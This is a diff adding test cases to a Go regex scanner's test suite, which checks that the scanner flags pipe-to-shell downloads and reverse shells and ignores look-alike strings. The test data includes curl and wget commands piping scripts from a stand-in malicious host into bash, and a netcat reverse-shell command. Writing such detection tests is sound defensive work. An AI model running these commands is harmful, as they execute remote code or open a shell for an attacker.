@@ -37,6 +37,46 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "api_key = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
+		{
+			name:        "Curl Pipe Bash",
+			content:     "curl https://malicious.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Wget Pipe Sh",
+			content:     "wget -O - https://malicious.com/install.sh | sh",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Netcat Reverse Shell",
+			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "Reverse Shell",
+		},
+		{
+			name:        "Sudo Bash",
+			content:     "curl https://example.com | sudo bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Word Boundary Start",
+			content:     "scurl https://example.com | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Word Boundary End",
+			content:     "curl https://example.com | bashful",
+			wantFinding: "",
+		},
+		{
+			name:        "Async -e",
+			content:     "async -e error",
+			wantFinding: "",
+		},
+		{
+			name:        "Inc -e",
+			content:     "inc -e",
+			wantFinding: "",
+		},
 	}
 
 	for _, tt := range tests {
